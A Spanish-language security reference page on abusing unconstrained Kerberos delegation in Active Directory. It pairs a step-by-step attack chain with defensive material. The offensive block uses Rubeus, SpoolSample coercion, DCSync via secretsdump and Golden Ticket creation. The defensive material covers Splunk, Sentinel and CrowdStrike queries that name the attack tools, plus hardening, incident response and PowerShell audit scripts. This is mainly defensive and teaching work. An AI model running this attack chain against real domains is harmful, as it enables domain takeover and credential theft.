# 🛑 Ataques de **Unconstrained Delegation (Delegación No Restringida) en Active Directory**

---

## 📝 ¿Qué es Unconstrained Delegation y por qué es peligroso?

| Concepto      | Descripción                                                                                                       |
|---------------|------------------------------------------------------------------------------------------------------------------|
| **Definición**| Mecanismo de delegación Kerberos más peligroso que permite a un servicio obtener TGTs de cualquier usuario que se autentique contra él y usarlos para suplantar a esos usuarios ante cualquier servicio del dominio. |
| **Finalidad** | Diseñado para servicios que necesitan acceder a recursos remotos en nombre de usuarios (como servidores web que acceden a bases de datos). Su abuso permite a atacantes obtener tickets de administradores y comprometer completamente el dominio. |

---

## 🛠️ ¿Cómo funciona y cómo se explota Unconstrained Delegation? (TTPs y ejemplos)

| Vector/Nombre              | Descripción breve                                                                                   |
|----------------------------|----------------------------------------------------------------------------------------------------|
| **Compromiso de servidor con delegación** | El atacante compromete un servidor configurado con delegación no restringida y extrae TGTs almacenados en memoria. |
| **SpoolSample + Unconstrained** | Combina CVE de impresión con delegación para forzar al DC a autenticarse y capturar su TGT. |
| **Coerción de autenticación** | Usa técnicas como PetitPotam, PrinterBug o WebClient para forzar autenticación de cuentas privilegiadas. |
| **Extracción de TGT de memoria** | Usa Rubeus, Mimikatz o técnicas de volcado de memoria para extraer tickets almacenados. |
| **TGT forwarding** | Reutiliza TGTs capturados para acceder a cualquier servicio del dominio como el usuario original. |
| **Persistence via delegation** | Mantiene acceso configurando nuevos servicios con delegación no restringida. |

---

## 💻 Ejemplo práctico ofensivo (paso a paso)

```bash
# 1. Enumerar servicios con delegación no restringida
findDelegation.py -target-domain soporte.htb -hashes :aad3b435b51404eeaad3b435b51404ee

# 2. Con Rubeus - buscar delegación no restringida
.\Rubeus.exe tgtdeleg /targetuser:SERVIDOR01$ /domain:soporte.htb /dc:dc.soporte.htb

# 3. Comprometer servidor con delegación (ejemplo: credenciales válidas)
nxc smb 10.10.11.174 -u administrador -p Password123 -x "whoami"

# 4. Extraer TGTs almacenados en memoria del servidor comprometido
.\Rubeus.exe dump /luid:0x14794e /service:krbtgt

# 5. Alternativamente, forzar autenticación del DC usando SpoolSample
python3 SpoolSample.py soporte.htb/usuario:Password123@DC.SOPORTE.HTB SERVIDOR01.SOPORTE.HTB

# 6. Monitorear y capturar el TGT del DC cuando se autentique
.\Rubeus.exe monitor /targetuser:DC$ /interval:5

# 7. Usar el TGT capturado para autenticarse como el DC
.\Rubeus.exe ptt /ticket:doIFuj...

# 8. DCSync para obtener hashes de todo el dominio
impacket-secretsdump -just-dc soporte.htb/DC$@DC.SOPORTE.HTB -k -no-pass

# 9. Crear Golden Ticket para persistencia
impacket-ticketer -nthash aad3b435b51404eeaad3b435b51404ee -domain-sid S-1-5-21-... -domain soporte.htb Administrator
```

---

## 📊 Detección en logs y SIEM (Splunk)

| Campo clave                     | Descripción                                                                  |
|---------------------------------|------------------------------------------------------------------------------|
| **EventCode = 4624**            | Logons tipo 3 (network) desde servicios con delegación a recursos críticos.  |
| **EventCode = 4648**            | Explicit credential use (runas) desde cuentas de servicio con delegación.     |
| **EventCode = 4769**            | Solicitud de tickets TGS usando TGTs almacenados/forwarded.                   |
| **EventCode = 4768**            | Solicitud TGT desde servicios (inusual - indica TGT forwarding).              |
| **CommandLine/Image (Sysmon)**  | Procesos como Rubeus.exe, SpoolSample.py, findDelegation.py, mimikatz.exe.    |

### Query Splunk: Servicios con delegación no restringida

```splunk
index=wineventlog EventCode=4624 LogonType=3
| lookup servicios_delegacion.csv ServiceName as TargetUserName
| where Delegation="Unconstrained"
| table _time, SourceNetworkAddress, TargetUserName, WorkstationName
```

### Query: TGT requests desde servicios (anómalo)

```splunk
index=wineventlog EventCode=4768
| search TargetUserName="*$"
| search NOT TargetUserName="krbtgt"
| table _time, TargetUserName, IpAddress, ServiceName
| stats count by TargetUserName, IpAddress
| where count > 10
```

### Query: Uso de herramientas de delegación

```splunk
index=sysmon_logs EventCode=1
| search (Image="*Rubeus.exe" OR CommandLine="*SpoolSample*" OR CommandLine="*findDelegation*" OR CommandLine="*tgtdeleg*" OR CommandLine="*monitor*")
| table _time, Computer, User, Image, CommandLine, ParentImage
```

### Query: Actividad sospechosa post-compromiso

```splunk
index=wineventlog EventCode=4648
| search TargetServerName="*$" AND SubjectUserName!="*$"
| table _time, SubjectUserName, TargetUserName, TargetServerName, ProcessName
```

---

## 🛡️ Detección con Windows Defender for Endpoint

### Reglas de detección personalizadas

```kql
// Unconstrained Delegation - Detección de extracción de TGT
DeviceProcessEvents
| where ProcessCommandLine has_any ("dump", "tgtdeleg", "monitor", "unconstrained")
| where ProcessCommandLine has_any ("krbtgt", "TGT", "ticket")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, FileName
| order by Timestamp desc
```

```kql
// Detección de herramientas de delegación conocidas
DeviceProcessEvents
| where FileName in~ ("Rubeus.exe", "mimikatz.exe") or ProcessCommandLine has_any ("SpoolSample", "findDelegation")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, SHA256
| order by Timestamp desc
```

```kql
// Detección de coerción de autenticación + delegación
DeviceProcessEvents
| where ProcessCommandLine has_any ("SpoolSample", "PetitPotam", "PrinterBug", "dfscoerce")
| join kind=inner (
    DeviceProcessEvents
    | where ProcessCommandLine has_any ("monitor", "dump", "tgtdeleg")
    | project Timestamp, DeviceName, ProcessCommandLine
) on DeviceName
| where Timestamp1 - Timestamp < 5m
| project Timestamp, DeviceName, ProcessCommandLine, ProcessCommandLine1
```

### Alertas recomendadas

| Regla | Descripción | Severidad |
|-------|-------------|-----------|
| **TGT Extraction** | Extracción de TGT usando herramientas como Rubeus | Crítica |
| **Delegation Tools** | Uso de herramientas de abuso de delegación | Alta |
| **Coercion + Delegation** | Combinación de coerción y delegación | Crítica |
| **Service TGT Request** | Servicios solicitando TGT (comportamiento anómalo) | Media |

---

## 🦅 Detección con CrowdStrike Falcon

### Hunting queries (Event Search)

```sql
-- Detección de uso de Rubeus para delegación
event_platform=Win event_simpleName=ProcessRollup2
| search (CommandLine=*Rubeus* AND (CommandLine=*dump* OR CommandLine=*tgtdeleg* OR CommandLine=*monitor*))
| table _time, ComputerName, UserName, FileName, CommandLine, SHA256HashData
| sort - _time
```

```sql
-- Detección de coerción de autenticación
event_platform=Win event_simpleName=ProcessRollup2
| search (CommandLine=*SpoolSample* OR CommandLine=*PetitPotam* OR CommandLine=*PrinterBug*)
| table _time, ComputerName, UserName, CommandLine, ParentBaseFileName
| sort - _time
```

```sql
-- Detección de TGT forwarding anómalo
event_platform=Win event_simpleName=AuthActivityAuditLog
| search LogonType=3 AND TargetUserName="*$"
| table _time, ComputerName, UserName, TargetUserName, ServiceName
| stats count by TargetUserName, ComputerName
| where count > 20
```

### Custom IOAs (Indicators of Attack)

```sql
-- IOA para detectar extracción masiva de tickets
event_platform=Win event_simpleName=KerberosLogon
| search TicketEncryptionType=*
| stats count by ComputerName, UserName, bin(_time, 1m)
| where count > 15
```

---

## 🔍 Queries KQL para Microsoft Sentinel

### Detección de Unconstrained Delegation

```kql
// Query principal para detectar abuso de delegación no restringida
SecurityEvent
| where EventID == 4624 // Successful logon
| where LogonType == 3 // Network logon
| where TargetUserName endswith "$" // Service accounts
| join kind=inner (
    DeviceProcessEvents
    | where ProcessCommandLine has_any ("dump", "tgtdeleg", "monitor")
    | project TimeGenerated, DeviceName, ProcessCommandLine
) on $left.WorkstationName == $right.DeviceName
| project TimeGenerated, WorkstationName, TargetUserName, ProcessCommandLine
```

```kql
// Detección de TGT requests anómalos desde servicios
SecurityEvent
| where EventID == 4768 // TGT request
| where TargetUserName endswith "$" and TargetUserName != "krbtgt"
| summarize TGTRequests = count() by TargetUserName, IpAddress, bin(TimeGenerated, 5m)
| where TGTRequests > 5
| order by TGTRequests desc
```

### Hunting avanzado

```kql
// Correlación: Coerción + Extracción de TGT
DeviceProcessEvents
| where ProcessCommandLine has_any ("SpoolSample", "PetitPotam", "dfscoerce")
| extend CoercionTime = TimeGenerated
| join kind=inner (
    DeviceProcessEvents
    | where ProcessCommandLine has_any ("Rubeus", "monitor", "dump")
    | extend ExtractionTime = TimeGenerated
) on DeviceName
| where ExtractionTime - CoercionTime between (0s .. 10m)
| project CoercionTime, ExtractionTime, DeviceName, ProcessCommandLine, ProcessCommandLine1
```

```kql
// Detección de Golden Ticket creation
SecurityEvent
| where EventID == 4768 // TGT request
| where TicketEncryptionType == "0x12" // AES256
| where ServiceName == "krbtgt"
| where TargetUserName == "Administrator"
| summarize GoldenTicketSigns = count() by IpAddress, bin(TimeGenerated, 1h)
| where GoldenTicketSigns > 3
```

---

## 🦾 Hardening y mitigación

| Medida                                         | Descripción                                                                                       |
|------------------------------------------------|--------------------------------------------------------------------------------------------------|
| **Eliminar delegación no restringida**         | Auditar y eliminar configuraciones innecesarias de unconstrained delegation.                     |
| **Restricción de servicios con delegación**    | Solo servicios críticos y auditados deben tener delegación habilitada.                          |
| **Auditoría continua de configuraciones**      | Script diario que revisa servicios con delegación y alerta sobre cambios.                        |
| **Separación de servicios críticos**           | Servicios con delegación en segmentos de red separados y monitorizados.                          |
| **Credential Guard habilitado**                | Protege credenciales en memoria contra extracción.                                               |
| **Protected Users Group**                      | Agregar cuentas privilegiadas al grupo Protected Users.                                          |
| **LAPS para cuentas locales**                  | Evita reutilización de credenciales locales en servidores con delegación.                        |
| **Restricted Admin Mode**                      | Limita capacidades de autenticación en servidores comprometidos.                                 |
| **Monitorización de TGT forwarding**           | Alertas SIEM específicas para detección de uso anómalo de tickets.                               |
| **Honeypots con delegación**                   | Servicios trampa con delegación que alertan ante cualquier acceso.                               |
| **Zero Trust Architecture**                    | Verificación continua de autenticación independientemente de la delegación.                      |

---

## 🚨 Respuesta ante incidentes

1. **Aislar inmediatamente el servidor comprometido** con delegación no restringida.
2. **Revocar todos los tickets Kerberos** del dominio (reinicio de clave krbtgt).
3. **Auditar logs de acceso** desde el servidor comprometido en las últimas 24-48 horas.
4. **Revisar y eliminar configuraciones** de delegación no restringida innecesarias.
5. **Cambiar credenciales** de todas las cuentas que se autenticaron contra el servidor.
6. **Buscar indicadores de Golden Ticket** y otros tickets persistentes.
7. **Implementar monitorización reforzada** en servicios restantes con delegación.
8. **Documentar el incidente** y revisar configuraciones similares en el entorno.

---

## 🧑‍💻 ¿Cómo revisar delegación no restringida? (PowerShell)

### Listar servicios con delegación no restringida

```powershell
Get-ADComputer -Filter {TrustedForDelegation -eq $True} -Properties TrustedForDelegation,ServicePrincipalName,Description |
Select-Object Name,TrustedForDelegation,ServicePrincipalName,Description
```

### Auditar cambios en configuración de delegación

```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4742} |
Where-Object {$_.Message -like "*TrustedForDelegation*"} |
Select-Object TimeCreated,Id,@{Name='ComputerModified';Expression={($_.Properties[0].Value)}}
```

### Buscar cuentas de usuario con delegación (menos común pero crítico)

```powershell
Get-ADUser -Filter {TrustedForDelegation -eq $True} -Properties TrustedForDelegation,ServicePrincipalName |
Select-Object Name,TrustedForDelegation,ServicePrincipalName
```

### Revisar permisos para configurar delegación

```powershell
# Requiere módulos como PowerView
Get-DomainObjectAcl -Identity "Domain Computers" | Where-Object {$_.ObjectAceType -eq "User-Force-Change-Password" -or $_.ObjectAceType -eq "Validated-Write"}
```

### Script de auditoría completa

```powershell
# Auditoría completa de delegación en el dominio
$UnconstrainedComputers = Get-ADComputer -Filter {TrustedForDelegation -eq $True} -Properties TrustedForDelegation,ServicePrincipalName,LastLogonDate
$UnconstrainedUsers = Get-ADUser -Filter {TrustedForDelegation -eq $True} -Properties TrustedForDelegation,ServicePrincipalName,LastLogonDate

Write-Host "=== SERVICIOS CON DELEGACIÓN NO RESTRINGIDA ===" -ForegroundColor Red
$UnconstrainedComputers | Format-Table Name,ServicePrincipalName,LastLogonDate -AutoSize

Write-Host "=== USUARIOS CON DELEGACIÓN NO RESTRINGIDA ===" -ForegroundColor Red
$UnconstrainedUsers | Format-Table Name,ServicePrincipalName,LastLogonDate -AutoSize

if ($UnconstrainedComputers -or $UnconstrainedUsers) {
    Write-Host "¡CRÍTICO! Se encontraron cuentas con delegación no restringida" -ForegroundColor Red
} else {
    Write-Host "✓ No se encontraron cuentas con delegación no restringida" -ForegroundColor Green
}
```

---

## 🧠 Soluciones innovadoras y hardening avanzado

- **Honeypots con delegación trampa:**  
  Servicios señuelo configurados con delegación que alertan ante cualquier intento de extracción de TGT.
- **Detección de TGT forwarding en tiempo real:**  
  Correlación SIEM que detecta patrones anómalos de uso de tickets entre servicios.
- **Alertas de memoria en servicios críticos:**  
  EDR configurado para alertar ante cualquier intento de volcado de memoria en servicios con delegación.
- **Integración con Threat Intelligence:**  
  IOC sobre hashes, procesos y campañas conocidas de abuso de delegación.
- **YARA custom para herramientas de delegación:**  
  Detección proactiva de Rubeus, Mimikatz y herramientas similares.
- **Automatización de respuesta:**  
  SOAR que automáticamente aísla servicios y revoca tickets ante detección de abuso.
- **Machine Learning para detección:**  
  Modelos que aprenden patrones normales de delegación y detectan anomalías.

---

## 🔧 Parches y actualizaciones

| Parche/Update | Descripción                                                                                  |
|---------------|----------------------------------------------------------------------------------------------|
| **KB5008102** | Windows 11/10/Server - Correcciones críticas en delegación Kerberos (CVE-2021-42278/42287). |
| **KB5025238** | Windows 11 22H2 - Mejoras en validación de delegación y protección contra abuso.            |
| **KB5022906** | Windows Server 2022 - Fortalecimiento de controles de delegación no restringida.            |
| **KB4580390** | Windows Server 2016 - Mejoras en auditoría y logging de delegación.                        |
| **Credential Guard** | Habilitación obligatoria en servidores con servicios de delegación.                   |
| **LAPS v2** | Gestión de credenciales locales en equipos con delegación configurada.                        |

### Configuraciones de registro críticas

```powershell
# Habilitar auditoría avanzada de delegación
auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable
auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable /failure:enable

# Configurar logging extendido para delegación
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LmCompatibilityLevel" -Value 5
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters" -Name "LogLevel" -Value 1
```

### Configuraciones de GPO críticas

```powershell
# Restringir delegación no restringida a través de GPO
# Computer Configuration\Policies\Windows Settings\Security Settings\Local Policies\User Rights Assignment
# "Enable computer and user accounts to be trusted for delegation" - EMPTY (nadie debe tener este derecho)

# Configurar Credential Guard
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "RequirePlatformSecurityFeatures" -Value 1
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "LsaCfgFlags" -Value 1
```

### Scripts de validación post-configuración

```powershell
# Verificar que no hay delegación no restringida configurada
$DangerousServices = Get-ADComputer -Filter {TrustedForDelegation -eq $True}
$DangerousUsers = Get-ADUser -Filter {TrustedForDelegation -eq $True}

if (-not $DangerousServices -and -not $DangerousUsers) {
    Write-Host "✓ No se encontró delegación no restringida configurada" -ForegroundColor Green
} else {
    Write-Host "✗ CRÍTICO: Se encontró delegación no restringida" -ForegroundColor Red
    Write-Host "Servicios: $($DangerousServices.Name -join ', ')"
    Write-Host "Usuarios: $($DangerousUsers.Name -join ', ')"
}

# Verificar que Credential Guard está habilitado
$CredGuard = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "LsaCfgFlags" -ErrorAction SilentlyContinue
if ($CredGuard.LsaCfgFlags -eq 1) {
    Write-Host "✓ Credential Guard habilitado" -ForegroundColor Green
} else {
    Write-Host "✗ Credential Guard NO habilitado" -ForegroundColor Yellow
}
```

---

## 📚 Referencias

- [Unconstrained Delegation - HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/unconstrained-delegation)
- [Rubeus Documentation](https://github.com/GhostPack/Rubeus)
- [Impacket findDelegation.py](https://github.com/fortra/impacket/blob/master/examples/findDelegation.py)
- [SpoolSample Attack](https://github.com/leechristensen/SpoolSample)
- [CVE-2021-42278/42287 - Microsoft](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278)
- [Microsoft Docs - Kerberos Delegation](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [BloodHound - Delegation Edges](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html)
- [Credential Guard Documentation](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/)

---